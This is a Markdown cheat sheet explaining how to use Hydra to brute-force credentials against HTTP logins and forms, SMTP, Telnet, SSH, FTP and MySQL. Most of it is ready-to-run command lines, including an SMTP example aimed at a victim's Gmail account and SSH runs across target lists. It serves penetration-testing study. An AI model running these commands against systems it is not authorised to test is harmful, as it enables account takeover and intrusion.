# Hydra notes

Hydra is a very useful software when it comes to bruteforce credentials
on most commonly used protocols.
We are going to start with some flags which are generally used independently
from the protocol, so in the examples when we will see these flags, we can
immediately understand what they are used for.
Here is a list of common and general flags used with Hydra:

* `-L <filepath>` for the file path to use for usernames, separated by newlines
* `-P <filepath>` for the file path to use for passwords, separated by newlines
* `-C <filepath>` this is an alternative to -L and -P, since we can provide a unique file
    which contains both user and password, separated by a colon, like
    user1:passwdrandom
    user2:minestrone
    root:toor
    ...
* `-t <integer>` is the number of threads to use
* `-o <filepath>` allows us to specify an output file where to save results
* `-w <integer>` specifies the amount of seconds two wait between consecutive
    requests
* `-s <integer>` specifies the port number to use
* `-v` activates the verbose mode, to give us an idea of what is happening
    behind the scenes, so we will see each attempt, and the current combination
    of credentials which is being tested
* `-S` performs a connection using SSL
* `-l <username>` uses a single user for login instead of a list/file, so we can specify
    instead of -L a single user with `-l root` or `-l usrname1`
* `-M <filepath>` with this option we can specify a file which will contain on
    each line a different IP or website or resource, in order to perform 
    parallel cracking
* `-f` this flag when activated, will let hydra terminate as soon as it finds a
    single correct credential pair, so as soon as it succeeds it exits, this
    happens per host if we specify -M (so a set of machines)
* `-F` exits after the first found login/password pair for any host (for usage with -M)


## HTTP


### HTTP Basic Authentication
We can use the following commands for Basic HTTP Authentication, we can
understand that the authentication is basic from the headers of the response.

```sh
hydra -L users.txt -P words.txt www.site.com http-head /private/
# we provide users.txt as files containing users
# then words.txt as the password file and then we try
# a basic http authentication by using the http-head parameter
# then we provide the page /private/ which is the url path
# where we are asked for credentials
```

We can add with -e combinations to the already existing combinations provided 
from the users and password files in particular we can use `n` or `s` or `r` 
or all the combinations of them, their meaning is:

* `n` adds for each user also the null password
* `s` adds the combination of credentials username/username for each of the
    usernames
* `r` adds for each combination username/password also the reversed
    password/username

```sh
hydra -L users.txt -P words.txt www.site.com -e ns http-head /private/
# here we do the same thing as before, but we add combinations with
# `-e ns`, so we are also trying with an empty password for each
# of the users and with passwords equal to the username for each user
```


### HTTP Digest Authentication

```sh
hydra -l root -P test.txt -vV localhost http-get /forbidden-d2
# uses the username root with passwords from the file called test.txt
# it runs in verbose mode on localhost through http-get module we specify
# that this is an HTTP digest authentication found at path /forbidden-d2
```

```sh
hydra -l admin -P 1000_common_passwords.txt -s 8090 -f 192.168.1.4 http-get /get_camera_params.cgi
# uses the username admin with passwords from the file called
# 1000_common_passwords.txt it runs on port 8090 through 
# the -f flag it will stop as soon as it finds the first valid credentials
# the http-get module is specified to denote the presence of an HTTP digest
# authentication at the path /get_camera_params.cgi
```


### HTTP Forms

When it comes to HTTP login forms, we generally have to inspect the web
application, searching for messages which will appear on successful or failed
logins.

Generally for HTTP forms we will have hydra commands with the following
structure:

```sh
hydra -L <users_file> -P <password_file> <url> http[s]-[post|get]-form \
"index.php:param1=value1&param2=value2&user=^USER^&pwd=^PASS^&paramn=valn:[F|S]=messageshowed"
```

Where depending on the webpage and on the post we can have after url:
* http-get-form, in case of an http page with a get form
* https-get-form, in case of an https page with a get form
* http-post-form, in case of an http page with a post form
* https-post-form, in case of an https page with a post form

and after this a string we specify the "request string" which will contain the
following elements separated by a colon `:`:
* pageOnWhichTheLoginHappens
* list of parameters, here we have to specify with ^USER^ and ^PASS^ where
    usernames and passwords will be inserted
* a character which may be F (for failing strings) or S for successful strings
    followed by an equal sign `=` and a string which appears in a failed attempt
    or in a successful attempt, if we do not specify F or S, F is the default
    also because this is the more natural option, we generally know which
    strings will appear when we fail a login but not the ones which will appear
    when it is successful (unless we are dealing with a known web
    technology/framework).
    Let's see some examples, We can specify a failure string with `:F=mystringincaseoffailure`
    while we can specify a success string with `:S=mystringincaseofsuccess`.
    But we may also see online `:mystring` and it will be the equivalent of
    `:F=mystring`


Let's see some warmup examples:

```sh
hydra -l admin -P pass.txt https://url.com https-post-form "index.php:param1=value123&user=^USER^&pass=^PASS^:F=Bad login"
 # in this example we are in an https post form situation, 
 # as we may notice as request line we have the following structure
 # page:parameters:F=message_to_show_in_case_of_failure
```

```sh
hydra -l admin -P pass.txt https://url.com https-post-form "index.php:param1=value123&user=^USER^&pass=^PASS^:S=Success!!"
 # in this example we are in an https post form situation, 
 # as we may notice as request line we have the following structure
 # page:parameters:S=message_to_show_in_case_of_failure
```


### HTTP Get Login Forms

```sh
hydra -l admin -P /root/Desktop/wordlists/test.txt http://www.website.com \
http-get-form "/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect."
```

```sh
hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt -P /usr/share/seclists/Passwords/rockyou-40.txt \
  -e ns  -F  -u  -t 1  -w 10  -v  -V  192.168.1.44  http-get-form \
"/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome to the password protected area:H=Cookie\: security=low; PHPSESSID=${SESSIONID}"
```




### HTTP Post Login Forms

```sh
hydra 192.168.1.69 http-post-form "/w3af/bruteforce/form_login/dataReceptor.php:user=^USER^&pass=^PASS^:Bad login" \
-L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt
# Here we specified:
 # Host = 192.168.1.69
 # Method = http-form-post
 # URL = /w3af/bruteforce/form_login/dataReceptor.php
 # Form parameters = user=^USER^&pass=^PASS^
 # Failure response = Bad login
 # Users file = users.txt
 # Password file = pass.txt
 # Threads = -t 10
 # Wait for timeout = -w 30
 # Output file = -o hydra-http-post-attack.txt
```

We can make more complicated examples, for example by specifying specific
headers or cookies with:

```sh
hydra 192.168.1.69 http-post-form "/foo.php:user=^USER^&pass=^PASS^:S=success:C=/page/cookie:H=X-Foo: Foo" \
-L users.txt -P pass.txt -t 10 -w 1 -o hydra-http-post-attack.txt
 # in this case we specify that the cookie should be page/cookie
 # cookies can be specified with C=
 # and we also added an header with H= 
 # this header is called X-Foo and has as value Foo
```


```sh
hydra -L users.txt -P words.txt https://www.site.com  https-post-form "/index.cgi:login&name=^USER^&password=^PASS^&login=Login:Not allowed" &
 # here we use https-post-form, since the website uses https
```


```sh
hydra -L lists/usrname.txt -P lists/pass.txt localhost -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
# now we check for success by using S=Location, since wordpress uses a Location
# header to redirect the user, we can think about S as a sort of grep applied to
# the HTTP response
```

## SMTP

```sh
hydra smtp.victimsemailserver.com smtp -l useraccount@gmail.com -P '/root/Desktop/rockyou.txt' -s portnumber -S -v 
```
Generally the port used for SMTP is 465 and common SMTP server for common email
services are:
    * smtp.mail.yahoo.com
    * smtp.gmail.com
    * smtp.live.com (but on poort 587)


## Telnet

```sh
hydra -l <username> -P <password_file> telnet://targetname
```

## SSH

```sh
hydra -l root -M /path/to/ip/list.txt -P /path/to/passwordlist.txt ssh
```

```sh
hydra 192.168.1.26 ssh2 -s 22 -P pass.txt -L users.txt -e ns -t 10
 # this will attack the system 192.168.1.26 on port 22
 # and will use as password file pass.txt while
 # for users the file users.txt
 # the process will use 10 threads at a time
```


```sh
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 ssh://192.168.1.123
```

```sh
hydra -L logins.txt -P pws.txt -M targets.txt ssh
# tries the users from logins.txt and the paasswords from pws.txt
# on all the machines listed on targests.txt on the ssh port/service
```



## FTP 

```sh
hydra -l root -P 500-worst-passwords.txt 10.10.10.10 ftp
```


```sh
hydra -l user -P passlist.txt ftp://192.168.0.1
```

## MySQL and other databases

We can use hydra with many kinds of databases, anyway it is very important for
us to check that we have installed hydra with the adequate module to perform a
specific bruteforce.

**IMPORTANT**: if we did not install hydra with mysql5 support it will not work,
we can check the modules available by issuing a `hydra -h`, if we just see
`mysql(v4)` this means that our version will not be compatible with `mysql5`,
while if we see `mysql` then our version of hydra will be compatible also with
mysql5 databases.

```sh
hydra -L <your_username_file> -P <your_password_file> <IP> mysql -s 3306 -o output.txt
```
notice that this is equivalent to:

```sh
hydra -L <your_username_file> -P <your_password_file> <IP> mysql -o output.txt
 # by default mysql uses port 3306 so we do not need to specify it,
 # anyway it is fundamental to specify it if the mysql port is different
```


## Appendix A: Sending Hydra traffic through Proxy


It is often useful to analyze what we are actually doing with hydra, to this
purpose we can send the traffic to an intercepting proxy such as Burp.

To do this, we just have to set an environment variable:
```sh
export HYDRA_PROXY=http://127.0.0.1:8080
# or
export HYDRA_PROXY_HTTP=http://127.0.0.1:8080 
```

From `hydra -v` we can indeed read:
```sh
Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.
E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
     % export HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)
     % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080
     % export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)
```

